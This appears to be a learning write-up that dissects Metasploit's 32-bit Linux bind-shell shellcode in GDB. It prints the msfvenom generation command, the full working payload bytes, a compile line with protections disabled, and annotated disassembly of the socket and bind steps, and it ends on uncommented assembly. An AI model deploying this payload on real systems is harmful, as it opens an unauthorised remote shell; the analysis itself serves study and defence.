# MSF Generated payload analysis

This note is about analysis of metasploit framework generated shellcode.

OS: Ubuntu 16.04 32 bit

Debugger: GDB

Plug-in: pwndbg



## linux/x86/shell_bind_tcp

Generate shellcode:

```bash
$ msfvenom -p linux/x86/shell_bind_tcp -f c LHOST=0.0.0.0 LPORT=4444 -b \x00
```

Output (Payload size: 78 bytes):

```c
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```

Compile `loader.c` file into `msf_bind_shell`executable:

```bash
$ gcc -m32 -fno-stack-protector -z execstack load.c -o msf_bind_shell
```



**Note:** Before launch gdb, I do recommend to use some handy tools to boost this analysis process, cause constantly typing `disassemble` or `x/gbwx $esp/$eip/...` hunts my finger. For example, gdb pwn dev extensions like [pwndbg](https://github.com/pwndbg/pwndbg) or [gef](https://github.com/hugsy/gef), both were very fine gdb plug-in which can give you a colorful prompt at each breakpoint or interrupt your encontered, containing detailed information like register value, stack layout, etc. In this case, I use pwndbg to help me dissect functonality of msf shellcode.



Launch GDB:

```shell
$ gdb -q ./msf_bind_shell
```



Disassemble main function to locate memory address of shellcode entry point:

```shell
(gdb) disassemble main
```

The entry point is located at the last `call` before function `ret`. In my case, the shellcode entry point is at `0x08048477`.

Then, set breakpoint at this location and run it:

```shell
(gdb) break *0x08048477
```

```shell
(gdb) run
```

Now program will hit this breakpoint, step into entry shellcode execution:

```shell
(gdb) stepi
```

If you have [pwndbg](https://github.com/pwndbg/pwndbg) plug-in installed before, you will now have this prompt displayed:

![gdb-pwndbg](https://raw.githubusercontent.com/sparkyvxcx/Shellcode64/master/screenshot/2020-06-15_10-51.png)

Before diving into assembly code, here is a quick rehearsal about each register's functionality when calling syscall, the syscall interface under 32-bit Linux is provided through soft-interrupt `0x80`. The table below describes each register's usage when invoking syscall.

| Register | Usage          |
| -------- | -------------- |
| `EAX`    | Syscall number |
| `EBX`    | Argument 1     |
| `ECX`    | Argument 2     |
| `EDX`    | Argument 3     |
| `ESI`    | Argument 4     |
| `EDI`    | Argument 5     |

Now move on, disassemble this frame by use `disassemble` or `x/43i $esp` command.



Assembly snippet 1:

```assembly
0x0804a040 <+0>:    xor    ebx, ebx ; shellcode entrance
0x0804a042 <+2>:    mul    ebx      ; set both eax, edx to 0x00000000
0x0804a044 <+4>:    push   ebx
0x0804a045 <+5>:    inc    ebx      ; ebx now holds value 1
0x0804a046 <+6>:    push   ebx
0x0804a047 <+7>:    push   0x2
0x0804a049 <+9>:    mov    ecx, esp ; ecx holds stack address which point to value 2
0x0804a04b <+11>:   mov    al, 0x66 ; assign 102 to register al which calling sys_getuid
0x0804a04d <+13>:   int    0x80
```

Above code indicate that first, it zeroes out register `EBX`, so does register `EAX` and register `EDX`, and push `EBX` into the current stack frame, after that, it increments 1 for `EBX` and push it into the stack followed another push to push `0x2` into the stack again. 



Now the stack frame will look like this:

```assembly
         Address      Stack
                  +------------+
          ....    |    ....    |
                  +------------+
esp —▸ 0xbfffef60 | 0x00000002 |
                  +------------+
       0xbfffef64 | 0x00000001 |
                  +------------+
       0xbfffef68 | 0x00000000 | 
                  +------------+
          ....    |    ....    |
                  +------------+
```

Next instruction move `ESP`'s value to register `ECX` and move `0x66` (decimal 102) into 8-bit sub-register `AL` from `EAX`. Now it's clear that the program has `EBX` (Argument 1) holds 1 and `ECX` (argument 2) holds the reference to argument array passed to the sub-function socket with syscall number 102 which stands for [sys_socketcall](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl) system call.



pwngdb plug-in had register listed out before execute `int 0x80`:

![sys_socket](https://raw.githubusercontent.com/sparkyvxcx/Shellcode64/master/screenshot/2020-06-16_22-47.png)

Scoketcall stands for socket system calls, here is definition:

```c
int socketcall(int call, unsigned long *args);
```

And argument description:

> **call** determines which socket function to invoke.  **args** points to a block containing the actual arguments, which are passed through to the appropriate call.

Possible call values are defined as [follow](https://manpages.ubuntu.com/manpages/bionic/man2/socketcall.2.html):

```c
#define SYS_SOCKET      1       /* sys_socket(2) */
#define SYS_BIND        2       /* sys_bind(2) */
#define SYS_CONNECT     3       /* sys_connect(2) */
#define SYS_LISTEN      4       /* sys_listen(2) */
#define SYS_ACCEPT      5       /* sys_accept(2) */
#define SYS_GETSOCKNAME 6       /* sys_getsockname(2) */
#define SYS_GETPEERNAME 7       /* sys_getpeername(2) */
#define SYS_SOCKETPAIR  8       /* sys_socketpair(2) */
#define SYS_SEND        9       /* sys_send(2) */
#define SYS_RECV        10      /* sys_recv(2) */
#define SYS_SENDTO      11      /* sys_sendto(2) */
#define SYS_RECVFROM    12      /* sys_recvfrom(2) */
#define SYS_SHUTDOWN    13      /* sys_shutdown(2) */
#define SYS_SETSOCKOPT  14      /* sys_setsockopt(2) */
#define SYS_GETSOCKOPT  15      /* sys_getsockopt(2) */
#define SYS_SENDMSG     16      /* sys_sendmsg(2) */
#define SYS_RECVMSG     17      /* sys_recvmsg(2) */
```

Therefore, what this snippet actually does is invoking sub-function [socket](https://manpages.ubuntu.com/manpages/bionic/man2/socket.2.html) function, with actual arguments consist of  `0x2`, `0x1` which stands for `AF_INET` and `SOCK_STREAM`. After execution, this syscall return value is `0x3` a file descriptor and stored it in register `EAX`.




Assembly snippet 2:

```assembly
0x0804a04f <+15>:   pop    ebx        ; ebx now holds 0x2
0x0804a050 <+16>:   pop    esi        ; esi now holds 0x1
0x0804a051 <+17>:   push   edx        ; edx holds 0x0, null terminate following content
0x0804a052 <+18>:   push   0x5c110002 ; 0x5c11 stand for 4444, 0x0002 stand for family AF_INET in little endian format
0x0804a057 <+23>:   push   0x10
0x0804a059 <+25>:   push   ecx        ; push previous stack point (now pointing to 0x5c110002) into stak
0x0804a05a <+26>:   push   eax        ; push previous syscall return value into stack to save file descriptor
0x0804a05b <+27>:   mov    ecx,esp    ; save current stack point to ecx 
0x0804a05d <+29>:   push   0x66       ; push 0x66 (102) into stack
0x0804a05f <+31>:   pop    eax        ; pop 0x66 (102) out of stack and store it in register eax
0x0804a060 <+32>:   int    0x80
```

Again, since `EBX` holds `0x2` the actual function got invoked is sub-function [bind](https://manpages.ubuntu.com/manpages/bionic/man2/bind.2.html), and `ECX` holds the address of the other arguments.

Synopsis from man page:

```c
   int bind(int sockfd, const struct sockaddr *addr,
            socklen_t addrlen);
```

Possible return value:

> On  success,  zero is returned.  On error, -1 is returned, and errno is
> set appropriately.

Stack layout:

```assembly
               Address      Stack
                        +------------+
                ....    |    ....    |
                        +------------+
esp (ecx) —▸ 0xbfffef54 | 0x00000003 | ◂— socket file descriptor                      [0]
                        +------------+
             0xbfffef58 | 0xbfffef60 | ◂— memory address of bind address (0x5c110002) [1] —▸ [3]
                        +------------+
             0xbfffef5c | 0x00000010 | ◂— length of address                           [2]
                        +------------+
             0xbfffef60 | 0x5c110002 | ◂— reference by 0xbfffef58                     [3]
                        +------------+
             0xbfffef64 | 0x00000000 |
                        +------------+
                ....    |    ....    |
                        +------------+
```



Before calling syscall:

![sys_bind](https://raw.githubusercontent.com/sparkyvxcx/Shellcode64/master/screenshot/2020-06-17_10-46.png)



Assembly snippet 3:

```assembly
0x0804a062 <+34>:   mov    DWORD PTR [ecx+0x4],eax
0x0804a065 <+37>:   mov    bl,0x4
0x0804a067 <+39>:   mov    al,0x66
0x0804a069 <+41>:   int    0x80
0x0804a06b <+43>:   inc    ebx
0x0804a06c <+44>:   mov    al,0x66
0x0804a06e <+46>:   int    0x80
0x0804a070 <+48>:   xchg   ebx,eax
0x0804a071 <+49>:   pop    ecx
0x0804a072 <+50>:   push   0x3f
0x0804a074 <+52>:   pop    eax
0x0804a075 <+53>:   int    0x80
0x0804a077 <+55>:   dec    ecx
0x0804a078 <+56>:   jns    0x804a072 <buf+50>
0x0804a07a <+58>:   push   0x68732f2f
0x0804a07f <+63>:   push   0x6e69622f
0x0804a084 <+68>:   mov    ebx,esp
0x0804a086 <+70>:   push   eax
0x0804a087 <+71>:   push   ebx
0x0804a088 <+72>:   mov    ecx,esp
0x0804a08a <+74>:   mov    al,0xb
0x0804a08c <+76>:   int    0x80
0x0804a08e <+78>:   add    BYTE PTR [eax],al
```

